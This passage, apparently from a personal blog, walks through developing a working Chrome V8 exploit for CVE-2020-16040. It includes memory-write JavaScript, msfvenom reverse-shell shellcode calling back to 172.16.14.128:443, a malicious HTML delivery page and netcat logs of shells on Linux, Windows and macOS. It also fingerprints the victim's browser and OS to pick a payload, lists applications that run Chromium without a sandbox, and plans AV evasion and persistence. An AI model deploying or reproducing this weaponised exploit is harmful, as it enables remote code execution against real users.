     - table 0: 0x139908088d5d &lt;Table map = 0x139908246f35>
     - imported_function_refs: 0x139908042229 &lt;FixedArray[0]>
     - indirect_function_table_refs: 0x139908042229 &lt;FixedArray[0]>
     - managed_native_allocations: 0x139908088d15 &lt;Foreign>
     - memory_start: 0x7f76bc000000
     - memory_size: 65536
     - memory_mask: ffff
     - imported_function_targets: 0x5614ad4bb3b0
     - globals_start: (nil)
     - imported_mutable_globals: 0x5614ad4bb3d0
     - indirect_function_table_size: 0
     - indirect_function_table_sig_ids: (nil)
     - indirect_function_table_targets: (nil)
     - properties: 0x139908042229 &lt;FixedArray[0]>
     - All own properties (excluding elements): {}
    
    0x139908246e1d: [Map]
     - type: WASM_INSTANCE_OBJECT_TYPE
     - instance size: 212
     - inobject properties: 0
     - elements kind: HOLEY_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
     - back pointer: 0x1399080423b1 &lt;undefined>
     - prototype_validity cell: 0x139908182445 &lt;Cell value= 1>
     - instance descriptors (own) #0: 0x1399080421bd &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
     - prototype: 0x1399080873a1 &lt;Object map = 0x139908247395>
     - constructor: 0x139908211c9d &lt;JSFunction Instance (sfi = 0x139908211c75)>
     - dependent code: 0x1399080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)>
     - construction counter: 0
  </code>
  </pre>
<p>Again, our <code>vmmap</code> output shows our <code>rwx</code> page address (truncated for brevity):</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
  LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  0x38463acd2000     0x38463acd3000 rwxp     1000      0 [anon_38463acd2]    
</code>
</pre>
<p>Our <code>rwx</code> is located at <code>0x38463acd2000</code> in this instance. Now we can search <code>gdb</code> starting from our <code>wasmInstance</code> pointer, until we get a hit on our <code>rwx</code> (I switched to <code>pwndbg</code> at some point during my analysis stage, but its not relevant to do so):</p>
<p><center><img src="../images/pwndbg.png"></center></p>
<p>Our <code>wasmInstance</code> pointer is that of <code>0x139908212be1-1</code>, and our <code>rwx</code> is that of <code>0x139908212c47</code>. Therefore; <code>0xc47 - 0xbe0</code> = <code>0x67</code>. We now know the offset for our <code>rwx</code>.</p>
<p><b>NOTE</b> this offset can be calculated through numerous methods, and not solely on the method I used in the above.</p>
<p>We can then append the following to our exploit:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
let rwx = arb_read(addrof(wasmInstance) + 0x67n); //leaks rwx (offset 0x67)
</code>
</pre>
<p>A similar approach was taken for the aforementioned offsets, and will also be taken in determining the remaining offsets required for the exploit here, however I will strip this from the report for the sake of brevity. Also in saying that, code can be written to locate these offsets with markers as well.</p>
<p>We can then write our shellcode to memory via our created <code>rwx</code>:</p>
<pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    function write(buf) {
      let tmp = new ArrayBuffer(buf.length);
      let view = new DataView(tmp);
      //backingstore of victim buffer offset changed from 0x20 to 0x13
      let backing_store_addr = addrof(tmp) + 0x13n; 
  
      arb_write(backing_store_addr, rwx);
  
      for (let i = 0; i < buf.length; i++) {
          view.setUint8(i, buf[i]);
      }
  }  
  </code>
  </pre>
  <p><h3><font color="white">[ SHELLCODE WEAPONISATION ]</font></h3></p>
  <p>We can now generate  shellcode based upon the desired payload. In this case, it will be a TCP reverse shell to <code>172.16.14.128</code> on tcp port <code>443</code>. I used a seperate guest VM running on the same VLAN, as well as testing locally on a VM. While not completely ideal due to limitations, we can use <code>msfvenom</code> here:</p> 
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-sh">
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.16.14.128 LPORT=443 -f java      
  </code>
  </pre>
  <p>Which outputs the following (cleaned):</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code>
    0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,
    0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9,
    0x02,0x00,0x01,0xbb,0xac,0x10,0x0e,0x80,
    0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,
    0x2a,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x48,
    0xff,0xce,0x6a,0x21,0x58,0x0f,0x05,0x75,
    0xf6,0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,
    0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,
    0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,
    0x0f,0x05
  </code>
  </pre>
<p>We can then add this to our exploit, call <code>write(shellcode);</code> to have the shellcode written to <code>rwx</code> via our defined <code>write();</code> function that calls our <code>arb_write</code> primitive, also with the help of <code>wasm_entry();</code>:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
  //[...]
  //reverse tcp shell: 172.16.14.128 (tcp\443)
  var shellcode = new Uint8Array([
    0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,
    0x01,0x5e,0x0f,0x05,0x48,0x97,0x48,0xb9,
    0x02,0x00,0x01,0xbb,0xac,0x10,0x0e,0x80,
    0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,
    0x2a,0x58,0x0f,0x05,0x6a,0x03,0x5e,0x48,
    0xff,0xce,0x6a,0x21,0x58,0x0f,0x05,0x75,
    0xf6,0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,
    0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x53,
    0x48,0x89,0xe7,0x52,0x57,0x48,0x89,0xe6,
    0x0f,0x05
  ]);
  
  write(shellcode);
  wasm_entry();
  //[...]    
</code>
</pre>
<p>After running the above with <code>./d8</code>, we successfully spawn a reverse shell:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
  nc -lnvp 443
  Listening on 0.0.0.0 443
  Connection received on 172.16.14.129 34324
  id
  uid=1000(h0m3cr3w) gid=1000(h0m3cr3w) groups=1000(h0m3cr3w)      
</code>
</pre>
<p>Similar to the above, we can also create shellcode supported against other operating systems (OS). This will be discussed and integrated later within the <b>[ INCREASING RELIABILITY OF EXPLOIT ]</b> section of this article.</p>

<p><h3><font color="white">[ CRAFTING AN EVIL HTML PAGE AND BUILDING VULNERABLE CHROME BROWSER TARGET ]</font></h3></p>
<p>With our exploit being successful within the release version of <code>d8</code>, we know that the exploit is functional within our test environment. We can therefore, craft an evil HTML page and test the exploit in a real-world scenario. The idea is to create a HTML page which will call the exploit within a <code>&lt;script&lt;</code> tag. Alternatively, this could also be chained with various web application vulnerabilities amongst others.</p>
<p>First, we need to download the version of chrome associated with the vulnerable V8 engine, in this case, being <code>8.9.0</code>. The CVE ID references that this bug exists in Google Chrome prior to version <code>87.0.4280.88</code>. </p>
<p>The commit of chrome/chromium associated with the vulnerable version can be identified <a href="https://omahaproxy.appspot.com/">here</a>, which if this no longer works, has been replaced with <a href="https://chromiumdash.appspot.com/">this.</a></p>
<p>You can probably lookup version <code>87.0.4280.87</code> if it exists (or earlier if you prefer), for example, the output contains the following:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-plaintext">
  Commit: [8d2aecc2e87a4f36ddc1b80d57178b846e1632a9](https://chromium.googlesource.com/chromium/src/+log/8d2aecc2e87a4f36ddc1b80d57178b846e1632a9)

  Branch Base Commit: [ea420fb963f9658c9969b6513c56b8f47efa1a2a](https://chromium.googlesource.com/chromium/src/+log/ea420fb963f9658c9969b6513c56b8f47efa1a2a)
  
  Branch Base Position: 812852
  
  V8 Commit: [45d51f3f97a6058fced26b9c378fba5dcd924704](https://chromium.googlesource.com/v8/v8/+log/45d51f3f97a6058fced26b9c378fba5dcd924704)
  
  V8 Version: [8.7.220.29](https://chromium.googlesource.com/v8/v8/+log/8.7.220.29)
  
  V8 Position: [59](https://chromium.googlesource.com/v8/v8/+log/59)
  
  Skia Commit: [489348851cca51b23f522734b6db3c785ffdfaed](https://chromium.googlesource.com/skia/+log/489348851cca51b23f522734b6db3c785ffdfaed)
</code>
</pre>
<p>We can then pull the <code>8d2aecc2e87a4f36ddc1b80d57178b846e1632a9</code> commit, build chrome and test our specially crafted HTML page exploit. By running it on <code>localhost</code>, or on a seperate host/guest that's connected to the same LAN/VLAN. Alternatively you can download the <code>86.0.4240.*</code> release from <a href="https://chromium.cypress.io/linux/stable/86.0.4240.183">here</a>, which is the path I decided to choose. </p>
<p>Building the crafted HTML page, and using Python's Simple HTTP Server to serve:</p>
<pre style="background-color: #100E15; border: none !important;">
  <code class="language-sh">
    mkdir html_exploit
    cd html_exploit
    touch index.html   #<-- include HTML tags and script src ref to exploit.js
    touch exploit.js   #<-- include the JavaScript exploit here   
  </code>
  </pre>
  <p>For example, <code>exploit.js</code> contains the exploit, and the <code>index.html</code> page contains the following to call our <code>exploit.js</code>:</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-html">
    &lt;!doctype html>
    &lt;html>
      &lt;head>
      &lt;title>exploit</title>
      &lt;script type="text/javascript" src="exploit.js"></script>
      &lt;/head>
      &lt;body>
      Content goes here.
      &lt;/body>
    &lt;/html>     
  </code>
</pre>
<p>While in <code>html_exploit</code> directory, run:</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-sh">
    python -m SimpleHTTPServer 80
  </code>
  </pre>
<p>Open the vulnerable version of Chrome/Chromium. In this case I used version <code>86.0.4240</code> (as mentioned above). As time limitations prevented chaining the above exploit with a sandbox escape relevant to the same version of chrome/v8, it is imperative that the vulnerable version of chrome is opened with the <code>--no-sandbox</code> flag to disable Chrome's sandbox:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
  ./chrome --no-sandbox    
</code>
</pre>
<p>Then navigate to <code>localhost:80</code> (if exploiting locally) which will serve the <code>index.html</code> page and execute immediately as this is where the exploit is called from. Again, a reverse shell is successfully spawned:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
  nc -lnvp 443
  Listening on 0.0.0.0 443
  Connection received on 172.16.14.128 44246
  
  id
  uid=1000(h0m3cr3w) gid=1000(h0m3cr3w) groups=1000(h0m3cr3w)      
</code>
</pre>
<p>The complete exploit can be located in my GitHub repository <a href="https://github.com/ret2eax/exploits/tree/main/CVE-2020-16040">here</a>. The contents include the following:<br>
  - <code>exploit.js</code>- my final exploit that integrates DCL for abort checks, and altering execution flow, including that of payload delivery (monitor <code>console.log()</code> outputs during its execution).<br>
  - <code>index.html</code> - specially crafted HTML page, executing <code>exploit.js</code> on visit.<br>
  - <code>bowser.js</code> - DCL needed for additional abort checks and alternative payload delivery based on target user agents. </p>
<p><b>NOTE</b> for testing, the shellcode will need to be altered to your own internal <code>LHOST</code> IP address and desired port, alternatively you can statically set your VMs IP to <code>172.16.14.128</code> and catch the reverse shell on <code>tcp\443</code> . </p>
<p><h3><font color="white">[ INCREASING EXPLOIT RELIABILITY ]</font></h3></p>
<p>While this vulnerability could be chained with a sandbox escape, it should also be noted that some embedded versions of Chrome run without the sandbox enabled by default in order to allow Chrome access to more system resources. This means that in some cases it may still be possible to exploit this vulnerability on its own in order to gain RCE on a system. An example of applications that use Chrome based applications with <code>--no-sandbox</code> can be located <a href="https://no-sandbox.io">here</a>, as well as in the table below (**note** the below may be outdated, but gives good examples):</p>
<style>
  .custom-table, .custom-table th, .custom-table td {
    font-size: 13px;
  }
  </style>
  
  <table class="custom-table">
    <thead>
      <tr>
        <th style="text-align: left;">Application</th>
        <th style="text-align: center;">Sandbox Status</th>
        <th style="text-align: left;">Example of Exploitation</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td style="text-align: left;">Twitch</td>
        <td style="text-align: center;">DISABLED</td>
        <td style="text-align: left;"><a href="https://hackerone.com/reports/783877">2020-09-28 XSS to HTML injection RCE</a></td>
      </tr>
      <tr>
        <td style="text-align: left;">VSCode</td>
        <td style="text-align: center;">DISABLED</td>
        <td style="text-align: left;">
          <a href="https://www.zdnet.com/article/microsoft-releases-emergency-security-updates-for-windows-and-visual-studio/">ZDNet: Malicious extensions</a><br>
          <a href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-17023">CVE-2020-17023</a><br>
          <a href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-17022">CVE-2020-17022</a>
        </td>
      </tr>
      <tr>
        <td style="text-align: left;">Signal</td>
        <td style="text-align: center;">DISABLED</td>
        <td style="text-align: left;"></td>
      </tr>
      <tr>
        <td style="text-align: left;">FB Messenger</td>
        <td style="text-align: center;">DISABLED</td>
        <td style="text-align: left;"></td>
      </tr>
      <tr>
        <td style="text-align: left;">MS Teams</td>
        <td style="text-align: center;">DISABLED</td>
        <td style="text-align: left;"></td>
      </tr>
      <tr>
        <td style="text-align: left;">Keybase</td>
        <td style="text-align: center;">DISABLED</td>
        <td style="text-align: left;"></td>
      </tr>
      <tr>
        <td style="text-align: left;">Discord</td>
        <td style="text-align: center;">DISABLED</td>
        <td style="text-align: left;"></td>
      </tr>
      <tr>
        <td style="text-align: left;">WeChat</td>
        <td style="text-align: center;">DISABLED</td>
        <td style="text-align: left;"><a href="https://therecord.media/recent-chromium-bug-used-to-attack-chinese-wechat-users/">2021-04-20 Target Chinese WeChat users</a></td>
      </tr>
    </tbody>
  </table>
  
<p>In saying that, the reliability of this exploit is significantly implicated at this stage, however, I do plan to research this further in my spare time and chain this exploit with a viable sandbox escape for further development and to increase reliability by overcoming this limitation of exploitability.</p>
<p>After writing our exploit, we can also set programmatic aborts to ensure clean exits. This increases the reliability of the exploit, in the sense, of not creating crashes or faults that could be noisy. This can also help with debugging when adding alterations against different target variations.</p>
<p><h4><font color="white">[ EXPLOIT ABORT DEFINITIONS & ENUMERATION FOR ALTERNATIVE PAYLOAD DELIVERY ]</font></h4></p>
<p>Defining the abort function:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
  //define clean exit 'abort' function
  function abort(msg) {
          throw new Error(msg);
  }
</code>
</pre>
<p>We can then incorporate our abort checks, for the purposes of brevity, I have not included the source for all of these checks here. Refer to <code>exploit.js</code> to see these. Instead, I will list the abort checks made and describe there purpose below:</p>
<ul>
  <li>Abort if the target browser is not Chrome,</li>
  <li>Abort if the target browser is not a vulnerable version of Chrome,
  <li>The array length received was <code>>=0</code>, therefore, if the array length was <code>-1</code> the exploit continues to proceed, otherwise it would exit as it indicates that an OOB was not attained.</li>
  <li>The length of array <code>cor</code> was not less than <code>16962</code>, since we overwrote the length of <code>cor</code> to that of <code>0x4242</code> (hexadecimal representation of base 10 value: <code>16962</code>). If this length of <code>cor</code> was under this value, it would mean that overwriting the length of <code>cor</code> failed, and so a clean exit would be made. Otherwise, the exploit continues to execute.</li>
  <li>Abort if the target OS is not that of Windows, Linux or macOS (due to the exploit currently only supporting these three operating systems).</li>
  <li><code>[process]</code> and <code>[success]</code> outputs were integrated to show  positive execution flow.</li>
</ul>
<p><h4><font color="white">[ EXPLOIT ENUMERATES TARGET BROWSER VIA <code>getChromeVersion();</code> ]</font></h4></p>
<p>To add to the above, the aborts depending on the browser being ran by the victim is as follows:</p>
<pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    /*
    dynamically loading script within browser which will enumerate the target 
    to apply additional abort checks if prerequisites are not satisifed.
    */
    function dynamicallyLoadScript(url) {
       var script = document.createElement("script");  
          script.src = "bowser.js" 
          document.head.appendChild(script); 
      console.log('[process] dynamically loading additional abort checks');
    }
    console.log('[process] additional abort checks dynamically loaded');
    dynamicallyLoadScript();
    
    // event to run a callback function
    function loadScript(url, callback) {
        // Adding the script tag to the head
      var head = document.head;
      var script = document.createElement('script');
      script.type = 'text/javascript';
      script.src = "bowser.js"; 
    
      // Then bind the event to the callback function.
        // There are several events for cross browser compatibility.
      script.onreadystatechange = callback;
      script.onload = callback;
      // Fire the loading
      head.appendChild(script);
    }
    var getChromeVersion = function() {
    // determines whether the target is vulnerable, otherwise aborts.
      var browser = bowser.getParser(window.navigator.userAgent);
      console.log('[process] determining whether target is vulnerable or not');
      if (browser.parsedResult.browser.name != "Chrome") {
        abort('[error] target browser is not Chrome, but rather: '+browser.parsedResult.browser.name+' version '+browser.parsedResult.browser.version+', aborting exploit.');
      } else {
        console.log('[success] target browser is Chrome');
        if (browser.satisfies({chrome: '>=87.0.4280.88' })) {
          abort('[error] target Chrome browser is not vulnerable, version in use: '+browser.parsedResult.browser.version);
        } else {
          console.log('[success] target Chrome browser is of vulnerable version: '+browser.parsedResult.browser.version);
          //target is vulnerable, call exploit and set timeout.
          setTimeout(exploit, 1500);
          }
        }
      };
      loadScript("getChromeVersion.js", getChromeVersion);
  </code>
  </pre>
  <p>The above defined <code>getChromeVersion();</code> function incorporates a third-party library, <a href="https://github.com/lancedikson/bowser">bowser</a>, to determine what browser, and corresponding version is in use, as well as, other neat properties such as OS, architecture and attributes on which is in use by a potential target.</p>
<p>The aforementioned function I defined above contains conditional clause statements which  incorporates aborts for clean exits depending on what browser is in use by a target. If the returned value is **not** that of Chrome, the exploit aborts with a clean exit. However, if the returned value **was** that of Chrome, the exploit continues on to the next conditional statement, of which, determines whether or not the target browser is running a vulnerable version of Chrome. In this case, if the returned browser version is higher or equal to version <code>87.0.4280.88</code>, the exploit would exit cleanly without running. Otherwise the exploit calls the primary exploit function via <code>setTimeout(exploit, 1500);</code>, as Chrome versions prior to <code>87.0.4280.88</code> satisfies the conditions of exploitation.</p>
<p>Unfortunately, due to limitations with JavaScript, and remaining time constrains; I couldn't easily find a way to reference an external JavaScript library within another JavaScript file (<code>exploit.js</code>) in a more efficient manner, that wouldn't rely on dynamic code loading within the browser. I'm not entirely sure if this is possible? If you know of how I could have included this in the way I intended to do so, it would be great to know! Alternatively I could have probably just isolated this within a seperate <code>&lt;script src&gt;</code> within the <code>index.html</code> which also calls <code>exploit.js</code>. Regardless, I did however get this working with DCL accordingly:</p>
<p><h5><font color="white">[ EXPLOIT AGAINST VULNERABLE VERSION OF CHROME ]</font></h5></p>
<p><center><img src="../images/vulnchrome.png"></center></p>

<pre style="background-color: #100E15; border: none !important;">
  <code class="language-sh">
    Listening on 0.0.0.0 443
    Connection received on 172.16.14.128 53696
    id
    uid=1000(h0m3cr3w) gid=1000(h0m3cr3w) groups=1000(h0m3cr3w)     
  </code>
  </pre>
  <p><h5><font color="white">[ EXPLOIT AGAINST NON-VULNERABLE VERSION OF CHROME ]</font></h5></p>
  <p><center><img src="../images/nonvulnchrome.png"></center></p> 
  <p><h5><font color="white">[ EXPLOIT AGAINST COMPLETELY DIFFERENT BROWSER I.E FIREFOX ]</font></h5></p>
  <p><center><img src="../images/nonvulnfirefox.png"></center></p> 
   
  <p><h4><font color="white">[ EXPLOIT ENUMERATES TARGET OS VIA <code>getTargetOS();</code> ]</font></h4></p>
  <p>In similar fashion to the above, I have also included OS system checks which will alter payload delivery based on shellcode tailored for that given OS. The following <code>getTargetOS();</code> function also leverages DCL from the <code>bowser</code> library, and the function I have defined for this is illustrated below:</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    /*
    gets target OS, shellcode alters depending on the targeted environment
    being Windows, Linux or macOS.
    */
    var getTargetOS = function() {
        const parser = bowser.getParser(window.navigator.userAgent);
        var getTargetOS = parser.getOS();
        var getTargetOS = getTargetOS.name; //will output "Linux", or "Windows" etc
    
      if (getTargetOS == "Linux") {
          console.log('[process] target OS appears to be '+getTargetOS+', adapting..');
            console.log('[process] writing shellcode to memory, catch the reverse shell on 172.16.14.128 tcp 443');
             //use Linux shellcode
            linuxShellcode();
        }
    
      if (getTargetOS == "Windows") {
            console.log('[process] target OS appears to be '+getTargetOS+', adapting..');
            console.log('[process] writing shellcode to memory, catch the reverse shell on 172.16.14.128 tcp 443');
            //use Windows shellcode
            windowsShellcode();
            }
       
      if (getTargetOS == "macOS") {
            console.log('[process] target OS appears to be ' + getTargetOS + ', adapting..');
            console.log('[process] writing shellcode to memory, catch the reverse shell on 172.16.14.128 tcp 443');
            //use macOS shellcode
            osxShellcode();
        } else {
            abort('[error] No current support for ' + getTargetOS + ', aborting.');
        }
        
        /*
      Add support for other OS types here (i.e. even Android and iOS, as well as
      arch 32-bit and 64-bit conditions to alternate between offsets and other
      contextual environment changes.
      */
      
    };
    loadScript("getTargetOS.js", getTargetOS);
  </code>
  </pre>
<p>After the target browser is deemed to be satisfied, <code>setTimeout(exploit, 1500);</code> is called. Within <code>exploit();</code> I have defined this <code>getTargetOS();</code> function which contains conditional statements that determines what shellcode is going to be written to memory, based upon the target OS system. If the target OS is that of Linux, the shellcode tailored for a Linux environment will be written to memory for successful exploitation. If the target OS is that of Windows, the shellcode tailored for Windows systems will be written to memory. Similarly, if the target OS is macOS, the shellcode tailored for macOS will be executed. If the target OS is neither Linux, Windows nor macOS, the exploit aborts while reporting the target OS environment (enumeration for which support could be added), as there is no current support for other operating systems in the exploit as it currently stands. </p>

<p><h5><font color="white">[ EXPLOIT AGAINST LINUX SYSTEM ]</font></h5></p>
<p><center><img src="../images/linuxexploit.png"></center></p> 

<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
  Listening on 0.0.0.0 443
  Connection received on 172.16.14.128 42816
  id
  uid=1000(h0m3cr3w) gid=1000(h0m3cr3w) groups=1000(h0m3cr3w)   
</code>
</pre>


<p><h5><font color="white">[ EXPLOIT AGAINST WINDOWS SYSTEM ]</font></h5></p>
<p><center><img src="../images/winexploit.png"></center></p> 
<pre style="background-color: #100E15; border: none !important;">
  <code class="language-sh">
    Listening on 0.0.0.0 443
    Connection received on 172.16.14.128 42816
    id
    uid=1000(h0m3cr3w) gid=1000(h0m3cr3w) groups=1000(h0m3cr3w)   
  </code>
  </pre>
  <p><h5><font color="white">[ EXPLOIT AGAINST OSX PRIOR TO INTEGRATING SUPPORT ]</font></h5></p>
  <p><center><img src="../images/osxunsupported.png"></center></p> 
<p>no shell as I did not integrate support here <b>yet</b>. Displays abort based on unsupported target OS. However, not the case after adding support, see below:</p>
<p><h5><font color="white">[ EXPLOIT AGAINST OSX AFTER INTEGRATING SUPPORT ]</font></h5></p>
  <p><center><img src="../images/osxsupported.png"></center></p> 

<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
  Listening on 0.0.0.0 443
  Connection received on 172.16.14.128 43783
  id
  uid=1000(h0m3cr3w) gid=1000(h0m3cr3w) groups=1000(h0m3cr3w)     
</code>
</pre>
<p>In addition to the above, I had planned to include architecture checks here which would also alter execution flow based upon variations needed in terms of offsets (similarly with different versions of Chrome/V8) and other contextual changes. We could adequately determine what version of V8 was in use based on the returned Chrome version release. The one limitation here is that, this third-party DCL script relies heavily on user agents, and this could be problematic as user agents can be trivially spoofed or stripped. However, in majority of cases, I don't believe this to be the case. Other aborts will be caught in the event of this, therefore, sustaining reliability here. Given more time, I would have liked to overcome this limitation.</p>
<p>I would also would have liked to integrate support for this exploit to contain exploit compatibilityacross Android and iOS devices.</p>
<p><h3><font color="white">[ CURRENT RELIABILITY OF EXPLOIT ]</font></h3></p>
<p>The following addresses the current reliability of my exploit, alongside additional changes I would have like to have integrated, having more time, to increase said reliability.</p>
<p>Given all this complexity, we need to define what we mean by "100% reliable" in the context of <a href="https://googleprojectzero.blogspot.com/2015/06/what-is-good-memory-corruption.html">this Google Project Zero post</a>; a "100% reliable" exploit is one that is:</li>
  <ul>
      <li>Guaranteed to succeed against a specific version and environment, on account of comprising a series of deterministic and fully understood steps;</li>
      <li>Provides adequate control that at a minimum, all the above sources of unreliability can be detected and lead to aborts, not crashes.</li>
  </ul>
</ul></p>
<p>In respect to the above, the following open-ended questions were located and I answered these in the context of my exploit (at the current time of writing this). I have already addressed <b>some</b> of these above, but have re-iterated them here in Q&A format:</p>
<ul>
  <li>Does the exploit ever crash? A crash is a noisy signal that may lead to detection.
      <ul>
          <li>After running the exploit against various environments, being Ubuntu, Kali, Windows and macOS, I did not encounter many crashes. Most, if not all crashes that did happen, were during the exploit development phase while crafting the exploit itself.</li>
      </ul>
  </li>
  <li>Does the exploit terminate cleanly? In other words, are there checks to abort with a clean exit on the condition of unsuccessful exploitation i.e. no crash or other detectable signal?
      <ul>
          <li>The exploit contains various abort checks, reducing its ability to crash. As a result, this exploit will predominantly exit cleanly.</li>
      </ul>
  </li>
  <li>Is the exploit reliable across exhaustive test conditions?
      <ul>
          <li>In the sense of successful exploitation? Yes and no, it is reliable when fired against different browser types and versions (in terms of aborts), however only upon disabling Chrome's sandbox (as I ran out of time to include a sandbox escape here). Further, system level checks have been integrated which alters payload delivery, in terms of what shellcode needs to be executed in memory. Finally, this exploit only works on a 64-bit system, as alternative offsets for 32-bit systems were not integrated within the time constraints. Based on the above, I would say, in its current state, it is reliable against a plethora of test conditions being satisfied, but not all.</li>
      </ul>
  </li>
  <li>Does the exploit function in the presence of additional security metrics i.e. AV products?
      <ul>
          <li>There would be some limitations here, for example, if outbound connections were restricted, which, in turn would limit the success of a reverse shell that was incorporated within my exploit. However, on the inverse, a reverse shell is generally better than a bind shell as they are more likely to bypass firewalls, and less likely to be seen, with limitation of course.</li>
          <li>In addition to the above, the generated shellcode payload is likely to be detected by many AV solutions, mainly due to the use of <code>msfvenom</code> here. Further obfuscation would be needed here to bypass these AV signatures. In a real world environment, this would be crucial.</li>
      </ul>
  </li>
</ul>
<ul>
  <li>How will the exploit behave upon encountering an unusual environment? Will it succeed, crash, or abort? i.e System checks to navigate payload delivery alongside different aborts during the event of failure?
      <ul>
          <li>Given the various abort checks, the exploit will abort cleanly in the event of reaching an unusual environment that is not accounted for within the exploit. The <code>getChromeVersion();</code> check determines whether or not the browser in use is that of Chrome, if so it proceeds, otherwise aborts. If the browser is that of Chrome, an additional nested condition check is made on whether or not the version of Chrome in use is that of a vulnerable version. If so, the exploit is called. Otherwise, the exploit aborts before attempting to exploit the vulnerability. However, since these aborts are based on the user agent value, there could be limitations here as previously mentioned. In saying that, there are additional abort checks, for example, if the aborts do some how fail (extremely unlikely), there are multiple additional abort conditions in which the exploit would exit i.e. not receiving an out-of-bounds condition of which would naturally fail if the browser/version in use is not vulnerable. Further aborts would naturally occur as a byproduct of any hardening or additional security configurations integrated to reduce exploitability here. As mentioned before, minor alternative exploit execution flows have been integrated via <code>getTargetOS</code>. If the target OS is detected to be Linux, the exploit will alter to execute shellcode in memory tailored for a Linux system. On the inverse, if the detected OS is that of Windows, the windows-based shellcode will execute in memory to attain successful exploitation, the same with macOS. If the targeted environment does not return Windows, Linux or macOS via the <code>getTargetOS();</code> function, then the exploit aborts. Due to time limitations I did not include other OS versions, nor did I include different execution flow between different architectures.</li>
      </ul>
  </li>
  <li>Is the exploit cross-platform and cross-version?
      <ul>
          <li>This slightly ties into the above. However, due to the nature of V8, it is my understanding that the internals remain very similar, if not identical. Therefore, it is my assumption that minor changes would need to be integrated to account for cross-version targets (mainly offsets). In saying that, the exploit is tested to be cross-compatible on Linux, Windows and macOS systems (easily interchangeable due to the benefits of JIT compiler exploits).</li>
          <li>As it stands, this exploit currently works against x86 and x64 Chrome version <code>86.0.4240.183</code> running on a 64-bit CPU architecture system:
              <ul>
                  <li>Ubuntu 64-bit 20.04.5,</li>
                  <li>Kali Linux 2022.3-vmware-amd64,</li>
                  <li>Microsoft Windows 64-bit version 10.0.19042.1889, and;</li>
                  <li>Mac OS Monterey version 12.6</li>
              </ul>
          </li>
      </ul>
  </li>
  <li>Does the exploit have a robust continuation of execution? i.e. no post-exploitation instability or other untoward effects?
      <ul>
          <li>Currently this exploit requires you to listen for the reverse shell on <code>nc</code>, where typically post-exploitation vectors would need to be explored to attain persistence. Given more time I would have liked to have made changes here.</li>
      </ul>
  </li>
</ul>

<p><h4><font color="white">[ TODOs ]</font></h4></p>
<ul>
  <li>With browser detection, and target OS detection having been integrated with alternative execution flow, integrate additional support for various architectures and versions of V8 (i.e. alterations for 32-bit systems). As well as, implement a temporary Sandbox detection mechanism (until chained with a Sandbox escape).
      <ul>
          <li>I don't believe detecting the sandbox is a public feature, and this in itself may warrant a security bug on its own if identified, regardless this isn't too important for the exploit context here but would be good to research this further. In saying that though, with the current exploit conditions perhaps we can read something from the filesystem to determine if we can do so, if so Sandbox is probably disabled, otherwise, it is enabled. We could also use the read from System to determine arch?</li>
      </ul>
  </li>
  <li>Instead of statically setting the offsets, integrate search functionality that calculates these offsets dynamically which may be the easier approach when fired against different versions of V8, alongside different architecture types.</li>
  <li>Incorporate a Sandbox Escape for increased reliability where this exploit would work without running Chrome with a disabled sandbox.
      <ul>
          <li>A relevant sandbox escape to investigate here would be that of which can be triggered via Mojo IPC connection.
              <ul>
                  <li><a href="https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html">Google Project Zero Analysis</a></li>
                  <li><a href="https://medium.com/swlh/my-take-on-chrome-sandbox-escape-exploit-chain-dbf5a616eec5">Understanding the bug and Exploit by Adam Jordan</a></li>
                  <li><a href="https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf">zeroc0n 2021 Analysis by Singular Security Lab (PDF)</a></li>
                  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-16041">CVE-2020-16041</a></li>
                  <li><a href="https://packetstormsecurity.com/files/161581/Chrome-DataElement-Out-Of-Bounds-Read.html">PacketStorm Security Exploit (Public)</a></li>
              </ul>
          </li>
      </ul>
  </li>
  <li>Integrate payload obfuscation to bypass AV security products.</li>
  <li>Replace <code>console.log()</code> outputs as this is visible to the target, and makes the exploit more 'noisy'. Is there a way to get these outputs to <code>stdout</code> or across a TCP socket instead? What would the limitations look like here?</li>
  <li>Determine the best delivery mechanism for specific target exploitation.</li>
  <li>Implement a vector for persistent access to avoid post-exploitation constraints, and make this clean (could remove the requirement of always listening for the reverse shell). This would also alter depending on the returned result from <code>getTargetOS();</code>.</li>
